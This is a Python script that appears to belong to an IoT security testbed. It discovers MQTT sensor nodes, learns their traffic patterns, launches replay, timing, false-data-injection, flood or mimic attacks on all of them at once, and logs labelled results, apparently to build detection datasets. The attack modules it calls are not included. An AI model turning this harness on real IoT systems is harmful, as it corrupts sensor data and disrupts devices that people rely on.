#!/usr/bin/env python3
"""
=========================================================
ATTACK ALL ACTIVE NODES — simultaneously
=========================================================
Discovers all nodes publishing on iot/+/data, learns each
node's profile, then attacks every node in parallel threads.

Each node gets its own CaptureSession + attack thread + CSV.

RUN:
  python attack_all.py --attack fdi
  python attack_all.py --attack flood --learn 90 --duration 120
  python attack_all.py --attack none          # baseline all nodes
=========================================================
"""

import argparse
import threading
import time
import json
from collections import defaultdict

from adaptive_learner import build_profile, make_client
from capture import CaptureSession, build_tiny_ml, BROKER, PORT, USER, PASSWORD

import Attack_Replay
import Attack_Time
import Attack_FalseData
import Attack_Flood
import Attack_Mimic

ATTACK_MODULES = {
    "replay": Attack_Replay,
    "timing": Attack_Time,
    "fdi": Attack_FalseData,
    "flood": Attack_Flood,
    "mimic": Attack_Mimic,
}

WILDCARD_TOPIC = "iot/+/data"


def discover_nodes(broker, port, user, password, duration=10):
    """Subscribe to iot/+/data and collect which node IDs are active."""
    found = {}

    def on_message(client, userdata, msg):
        try:
            parts = msg.topic.split("/")
            if len(parts) == 3 and parts[0] == "iot" and parts[2] == "data":
                node_id = parts[1]
                if node_id not in found:
                    found[node_id] = msg.payload.decode()
                    print(f"[discover] found {node_id} -> {msg.topic}")
        except Exception:
            pass

    client = make_client("node_discoverer")
    client.username_pw_set(user, password)
    client.on_message = on_message
    client.connect(broker, port, 60)
    client.subscribe(WILDCARD_TOPIC)
    client.loop_start()

    print(f"=== DISCOVERING NODES for {duration}s ===")
    time.sleep(duration)
    client.loop_stop()
    client.disconnect()

    print(f"Found {len(found)} active node(s): {list(found.keys())}")
    return found


def learn_node(broker, port, user, password, topic, learn_duration):
    """Learn a single node's profile."""
    samples, raw_payloads, timestamps = [], [], []

    def on_message(client, userdata, msg):
        payload = msg.payload.decode()
        raw_payloads.append(payload)
        timestamps.append(time.time())
        try:
            samples.append(json.loads(payload))
        except Exception:
            samples.append({})

    client = make_client(f"learn_{topic.replace('/', '_')}")
    client.username_pw_set(user, password)
    client.on_message = on_message
    client.connect(broker, port, 60)
    client.subscribe(topic)
    client.loop_start()

    time.sleep(learn_duration)
    client.loop_stop()
    client.disconnect()

    node_id = topic.rstrip("/data").split("/")[-1]
    profile = build_profile(samples, timestamps, [len(p) for p in raw_payloads],
                            node_id=node_id)
    tiny_ml = build_tiny_ml(raw_payloads, timestamps)

    return profile, raw_payloads, timestamps, tiny_ml


def _launch_attack(name, profile, raw_payloads, topic, args, stop_event):
    module = ATTACK_MODULES[name]
    try:
        module.run(
            profile,
            broker=args.broker, port=args.port, user=args.user,
            password=args.password, target_topic=topic,
            duration=args.duration, stop_event=stop_event,
            captured=raw_payloads,
        )
    except Exception as exc:
        print(f"[{topic}] attack error ({name}): {exc}")


def run_node(args, node_id, topic, stop_event):
    """Learn + attack one node. Returns when attack finishes."""
    print(f"\n{'='*50}")
    print(f"  NODE: {node_id}  TOPIC: {topic}")
    print(f"{'='*50}")

    # Learn
    profile, raw, times, tiny_ml = learn_node(
        args.broker, args.port, args.user, args.password,
        topic, args.learn,
    )
    if not raw:
        print(f"[{node_id}] No messages learned — skipping")
        return

    print(f"[{node_id}] Learned {len(raw)} messages")

    # Attack
    if args.attack != "none":
        print(f"[{node_id}] ATTACK PHASE: {args.attack.upper()} for {args.duration}s")
        attack_thread = threading.Thread(
            target=_launch_attack,
            args=(args.attack, profile, raw, topic, args, stop_event),
            daemon=True,
        )
        attack_thread.start()
    else:
        print(f"[{node_id}] MONITORING baseline for {args.duration}s")
        attack_thread = None

    # Capture
    session = CaptureSession(
        args.broker, args.port, args.user, args.password,
        topic, args.out,
    )
    session.attack_start = time.time()
    ts_label = time.strftime('%Y%m%d_%H%M%S')
    session.open_csv(f"run_{node_id}_{args.attack}_{ts_label}.csv")
    for p, ts in zip(raw, times):
        session.record("baseline", ts, p, tiny_ml, node=node_id)

    phase = args.attack
    run_until = time.time() + args.duration if args.attack == "none" else None
    while True:
        session.record_drain(phase, tiny_ml)
        if attack_thread is None:
            if run_until is not None and time.time() < run_until:
                time.sleep(0.05)
                continue
            break
        if not attack_thread.is_alive():
            break
        time.sleep(0.05)

    session.record_drain(phase, tiny_ml)
    session.close_csv()
    session.close()
    print(f"\n[{node_id}] RESULTS:")
    session.print_summary()


def parse_args():
    p = argparse.ArgumentParser(description="Attack all active nodes simultaneously")
    p.add_argument("--broker", default=BROKER)
    p.add_argument("--port", type=int, default=PORT)
    p.add_argument("--user", default=USER)
    p.add_argument("--password", default=PASSWORD)
    p.add_argument("--learn", type=float, default=60.0)
    p.add_argument("--duration", type=float, default=60.0)
    p.add_argument("--attack", choices=list(ATTACK_MODULES) + ["none"],
                   default="fdi")
    p.add_argument("--out", default="runs")
    p.add_argument("--discover", type=float, default=10.0,
                   help="how long to listen for active nodes")
    return p.parse_args()


def main():
    args = parse_args()

    # Phase 1: discover
    nodes = discover_nodes(
        args.broker, args.port, args.user, args.password,
        duration=args.discover,
    )
    if not nodes:
        print("No active nodes found. Is everything powered on?")
        return

    # Phase 2: learn all nodes in parallel
    print(f"\n=== LEARNING ALL NODES for {args.learn}s ===")
    node_data = {}
    learn_threads = []

    def _learn_wrapper(node_id, topic):
        profile, raw, times, tiny_ml = learn_node(
            args.broker, args.port, args.user, args.password,
            topic, args.learn,
        )
        node_data[node_id] = (topic, profile, raw, times, tiny_ml)

    for node_id in nodes:
        topic = f"iot/{node_id}/data"
        t = threading.Thread(target=_learn_wrapper, args=(node_id, topic))
        learn_threads.append(t)
        t.start()

    for t in learn_threads:
        t.join()

    # Filter out nodes that got no data
    active = {nid: d for nid, d in node_data.items() if d[2]}
    if not active:
        print("No nodes received messages during learning. Is everything publishing?")
        return

    print(f"\nLearned {len(active)} node(s): {list(active.keys())}")

    # Phase 3: attack all simultaneously
    stop_event = threading.Event()
    threads = []

    for node_id, (topic, profile, raw, times, tiny_ml) in active.items():
        t = threading.Thread(
            target=run_node_simultaneous,
            args=(args, node_id, topic, profile, raw, times, tiny_ml, stop_event),
        )
        threads.append(t)
        t.start()

    try:
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        print("\nStopping all attacks...")
        stop_event.set()
        for t in threads:
            t.join(timeout=5)

    print("\n=== ALL NODES DONE ===")


def run_node_simultaneous(args, node_id, topic, profile, raw, times, tiny_ml, stop_event):
    """Run attack on one node (used for simultaneous mode)."""
    print(f"\n[{node_id}] Starting attack: {args.attack}")

    if args.attack != "none":
        attack_thread = threading.Thread(
            target=_launch_attack,
            args=(args.attack, profile, raw, topic, args, stop_event),
            daemon=True,
        )
        attack_thread.start()
    else:
        attack_thread = None

    session = CaptureSession(
        args.broker, args.port, args.user, args.password,
        topic, args.out,
    )
    session.attack_start = time.time()
    ts_label = time.strftime('%Y%m%d_%H%M%S')
    session.open_csv(f"run_{node_id}_{args.attack}_{ts_label}.csv")
    for p, ts in zip(raw, times):
        session.record("baseline", ts, p, tiny_ml, node=node_id)

    phase = args.attack
    run_until = time.time() + args.duration if args.attack == "none" else None
    while True:
        session.record_drain(phase, tiny_ml)
        if attack_thread is None:
            if run_until is not None and time.time() < run_until:
                time.sleep(0.05)
                continue
            break
        if not attack_thread.is_alive():
            break
        time.sleep(0.05)

    session.record_drain(phase, tiny_ml)
    session.close_csv()
    session.close()
    print(f"\n[{node_id}] RESULTS:")
    session.print_summary()


if __name__ == "__main__":
    main()
